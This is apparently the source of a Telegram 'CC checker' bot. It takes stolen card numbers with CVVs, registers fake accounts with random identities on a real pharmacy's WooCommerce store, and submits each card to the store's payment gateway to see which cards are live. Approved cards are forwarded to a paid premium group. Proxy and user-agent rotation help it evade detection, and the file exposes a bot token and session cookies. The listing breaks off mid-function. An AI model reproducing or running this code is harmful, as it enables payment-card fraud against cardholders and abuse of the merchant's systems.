import requests
import telebot
import re
import random
import string
import time
import asyncio
from bs4 import BeautifulSoup
import httpx
from fake_useragent import UserAgent
from telebot import types
from datetime import datetime, timedelta
from collections import deque
from threading import Thread
import asyncio
import random
import json
import base64
from fake_useragent import UserAgent

import httpx
import requests, re, base64, random, string, time
import random
import time
import json , requests,re
import uuid, asyncio
from fake_useragent import UserAgent
import json
from bs4 import BeautifulSoup


BOT_API_KEY = '7059781834:AAGRNXsuKCkmKgxTexr7h8rhOUjfzdPGh74'
bot = telebot.TeleBot(BOT_API_KEY)


OWNER_ID = 6574060333  # Replace with the owner ID
AUTHORIZED_USER_IDS = [OWNER_ID] 
PREMIUM_GROUP_ID = -1002147143291 # Replace with your group ID for sending approved CCs


user_tasks = {}

from datetime import datetime, timedelta

current_time = datetime.now()

one_day_before = current_time - timedelta(days=1)

formatted_time = one_day_before.strftime('%Y-%m-%d')




def load_premium_users():
    premium_users = {}
    try:
        with open('premium_users.txt', 'r') as file:
            lines = file.readlines()
            for line in lines:
                user_id, expiry_date = line.strip().split(',')
                premium_users[int(user_id)] = datetime.strptime(expiry_date, '%Y-%m-%d')
    except FileNotFoundError:
        pass
    return premium_users


def save_premium_users(premium_users):
    with open('premium_users.txt', 'w') as file:
        for user_id, expiry_date in premium_users.items():
            file.write(f'{user_id},{expiry_date.strftime("%Y-%m-%d")}\n')

premium_users = load_premium_users()

async def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

async def create_cvv_charge(fullz, session):
    try:
        await asyncio.sleep(20)
        cc, mes, ano, cvv = fullz.split("|")
        bin_info = await get_bin_info(cc[:6])
        user_agent = UserAgent().random
        # await asyncio.sleep(10)
       
        randomdataurl = "https://randomuser.me/api/?nat=us"

        try:
            response = requests.get(randomdataurl)
            random_data = response.json()
            first_name = random_data['results'][0]['name']['first']
            last_name = random_data['results'][0]['name']['last']
            fullname = f'{first_name} {last_name}'
            street = str(random_data['results'][0]['location']['street']['number']) + " " + random_data['results'][0]['location']['street']['name']
            street = street.replace(' ', '+')
            city = str(random_data['results'][0]['location']['city'])
            cityc = city.replace(' ', '+')
            zipcode = str(random_data['results'][0]['location']['postcode'])
            zipcodec = zipcode.replace(' ', '+')

            # Generate random username, email, and password
            rno = str(''.join(random.choices(string.digits, k=3)))
            username = f'{first_name}{last_name}0{rno}'
            email = f'{first_name}{last_name}{rno}@hotmail.com'
            password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
            area_code = str(random.randint(200, 999))
            exchange_code = str(random.randint(200, 999))    
            subscriber_number = str(random.randint(1000, 9999))
            mobile_number = f"{area_code}{exchange_code}{subscriber_number}"
            print(email)

        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")



        




        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user_agent,
        }

        result = await session.get('https://www.phprescription.com/my-account/',  headers=headers)
        woononce = await find_between(result.text, 'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '"')
        print('woo',woononce)
        await asyncio.sleep(12)

                
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F; tracker_device=b47da43d-34c2-4269-8d3e-9b3ad85776ea',
            'Origin': 'https://www.phprescription.com',
            'Referer': 'https://www.phprescription.com/my-account/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user_agent,
        }

        data = {
            'username': username,
            'email': email,
            'password': password,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://www.phprescription.com/my-account/',
            'wc_order_attribution_session_start_time': f'{formatted_time} 02:23:06',
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': user_agent,
            'woocommerce-register-nonce': woononce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        result = await session.post('https://www.phprescription.com/my-account/',headers=headers, data=data)
        await asyncio.sleep(12)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; tracker_device=b47da43d-34c2-4269-8d3e-9b3ad85776ea; wordpress_logged_in_426cc2e6a6ce5b4cd556db57a180e94f=rogint%7C1723949710%7C7XvdkkFAmXNS8Zq5o8YdVzltAz8jcGitzoUoK51x0xP%7C021cc13fb5c6d4cf95a227f197876cf3bd30b756f927bb6e5954fecdd8df515e; wfwaf-authcookie-3ca7cfec0030844337a11cbaa2fa65dc=374%7Cother%7Cread%7Cd62cbd7122a6b53a22ccbe677965e57c9c8332c02d19ec1873e0d00f18aa8fd4; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F; tk_ai=G2HNzD%2Fs8d13lQQlm2Dr4HfY; tk_qs=',
            'Referer': 'https://www.phprescription.com/my-account/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user_agent,
        }

        result = await session.get('https://www.phprescription.com/my-account/edit-address/',  headers=headers)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; tracker_device=b47da43d-34c2-4269-8d3e-9b3ad85776ea; wordpress_logged_in_426cc2e6a6ce5b4cd556db57a180e94f=rogint%7C1723949710%7C7XvdkkFAmXNS8Zq5o8YdVzltAz8jcGitzoUoK51x0xP%7C021cc13fb5c6d4cf95a227f197876cf3bd30b756f927bb6e5954fecdd8df515e; wfwaf-authcookie-3ca7cfec0030844337a11cbaa2fa65dc=374%7Cother%7Cread%7Cd62cbd7122a6b53a22ccbe677965e57c9c8332c02d19ec1873e0d00f18aa8fd4; tk_ai=G2HNzD%2Fs8d13lQQlm2Dr4HfY; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2Fedit-address%2F; tk_qs=',
            'Referer': 'https://www.phprescription.com/my-account/edit-address/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user_agent,
        }

        result = await session.get('https://www.phprescription.com/my-account/edit-address/billing/',  headers=headers)
        soup = BeautifulSoup(result.text, 'html.parser')
        addnonce = soup.find('input', {'id': 'woocommerce-edit-address-nonce'}).get('value')
        print('add',addnonce)
        await asyncio.sleep(12)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; tracker_device=b47da43d-34c2-4269-8d3e-9b3ad85776ea; wordpress_logged_in_426cc2e6a6ce5b4cd556db57a180e94f=rogint%7C1723949710%7C7XvdkkFAmXNS8Zq5o8YdVzltAz8jcGitzoUoK51x0xP%7C021cc13fb5c6d4cf95a227f197876cf3bd30b756f927bb6e5954fecdd8df515e; wfwaf-authcookie-3ca7cfec0030844337a11cbaa2fa65dc=374%7Cother%7Cread%7Cd62cbd7122a6b53a22ccbe677965e57c9c8332c02d19ec1873e0d00f18aa8fd4; tk_ai=G2HNzD%2Fs8d13lQQlm2Dr4HfY; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2Fedit-address%2Fbilling%2F; tk_qs=',
            'Origin': 'https://www.phprescription.com',
            'Referer': 'https://www.phprescription.com/my-account/edit-address/billing/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user_agent,
        }

        data = {
            'billing_first_name': first_name,
            'billing_last_name': last_name,
            'billing_company': '',
            'billing_country': 'US',
            'billing_address_1': street,
            'billing_address_2': '',
            'billing_city': cityc,
            'billing_state': 'NY',
            'billing_postcode': zipcodec,
            'billing_phone': mobile_number,
            'billing_email': email,
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': addnonce,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
        }

        result = await session.post(
            'https://www.phprescription.com/my-account/edit-address/billing/',
            # cookies=cookies,
            headers=headers,
            data=data,
        )
        await asyncio.sleep(12)

        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; tracker_device=b47da43d-34c2-4269-8d3e-9b3ad85776ea; wordpress_logged_in_426cc2e6a6ce5b4cd556db57a180e94f=rogint%7C1723949710%7C7XvdkkFAmXNS8Zq5o8YdVzltAz8jcGitzoUoK51x0xP%7C021cc13fb5c6d4cf95a227f197876cf3bd30b756f927bb6e5954fecdd8df515e; wfwaf-authcookie-3ca7cfec0030844337a11cbaa2fa65dc=374%7Cother%7Cread%7Cd62cbd7122a6b53a22ccbe677965e57c9c8332c02d19ec1873e0d00f18aa8fd4; tk_ai=G2HNzD%2Fs8d13lQQlm2Dr4HfY; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2Fedit-address%2F; tk_qs=',
            'Referer': 'https://www.phprescription.com/my-account/edit-address/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user_agent,
        }

        result = await session.get('https://www.phprescription.com/my-account/payment-methods/',  headers=headers)

        
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; tracker_device=b47da43d-34c2-4269-8d3e-9b3ad85776ea; wordpress_logged_in_426cc2e6a6ce5b4cd556db57a180e94f=rogint%7C1723949710%7C7XvdkkFAmXNS8Zq5o8YdVzltAz8jcGitzoUoK51x0xP%7C021cc13fb5c6d4cf95a227f197876cf3bd30b756f927bb6e5954fecdd8df515e; wfwaf-authcookie-3ca7cfec0030844337a11cbaa2fa65dc=374%7Cother%7Cread%7Cd62cbd7122a6b53a22ccbe677965e57c9c8332c02d19ec1873e0d00f18aa8fd4; tk_ai=G2HNzD%2Fs8d13lQQlm2Dr4HfY; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2Fpayment-methods%2F; tk_qs=',
            'Referer': 'https://www.phprescription.com/my-account/payment-methods/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user_agent,
        }

        result = await session.get('https://www.phprescription.com/my-account/add-payment-method/',  headers=headers)

        paynonce = await find_between(result.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        print("pay",paynonce)
        await asyncio.sleep(5)

       

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-04%2002%3A23%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; tracker_device=b47da43d-34c2-4269-8d3e-9b3ad85776ea; wordpress_logged_in_426cc2e6a6ce5b4cd556db57a180e94f=rogint%7C1723949710%7C7XvdkkFAmXNS8Zq5o8YdVzltAz8jcGitzoUoK51x0xP%7C021cc13fb5c6d4cf95a227f197876cf3bd30b756f927bb6e5954fecdd8df515e; wfwaf-authcookie-3ca7cfec0030844337a11cbaa2fa65dc=374%7Cother%7Cread%7Cd62cbd7122a6b53a22ccbe677965e57c9c8332c02d19ec1873e0d00f18aa8fd4; tk_ai=G2HNzD%2Fs8d13lQQlm2Dr4HfY; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.phprescription.com%2Fmy-account%2Fadd-payment-method%2F; tk_qs=',
            'Origin': 'https://www.phprescription.com',
            'Referer': 'https://www.phprescription.com/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user_agent,
        }

        data = {
            'payment_method': 'first_data_payeezy_gateway_credit_card',
            'wc-first-data-payeezy-gateway-credit-card-account-number': cc,
            'wc-first-data-payeezy-gateway-credit-card-expiry': f'{mes} / {ano}',
            'wc-first-data-payeezy-gateway-credit-card-csc': cvv,
            'wc-first-data-payeezy-gateway-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': paynonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        result = await session.post(
            'https://www.phprescription.com/my-account/add-payment-method/',
            # cookies=cookies,
            headers=headers,
            data=data,
            follow_redirects=True
)
        
        
    
        if 'Payment method successfully added.' in result.text or \
            'Nice! New payment method added' in result.text or \
            'Duplicate card exists in the vault.' in result.text or \
            'Status code avs: Gateway Rejected: avs' in result.text or \
            'Status code cvv: Gateway Rejected:' in result.text:
                
                print("worked")
                return f"Approved \n{bin_info}"


        else:
                # Parse the HTML content
            soup = BeautifulSoup(result.text, 'html.parser')
            error_elements = soup.find_all('ul', class_='woocommerce-error')
            
            for error_element in error_elements:
                for li in error_element.find_all('li'):
                    if 'Status code' in li.text:
                        reason = li.text.strip()
                        
                        print(reason)
                        return f"{reason} ðŸš«"
        return f"Decline \n{bin_info}"
                            

    except Exception as e:
        print(str(e))
        return 'error'

async def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}")
        data = response.json()
        bin_info = (
    f"🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {data.get('country_name', 'N/A')} {data.get('country_flag', 'N/A')}\n"
    
)


        return bin_info
    except Exception as e:
        return str(e)

async def multi_checking(x, chat_id, message_id):
    start = time.time()
    getproxy = random.choice(open("proxy.txt", "r", encoding="utf-8").read().splitlines())
    proxy_ip, proxy_port, proxy_user, proxy_password = getproxy.split(":")
    proxies = {
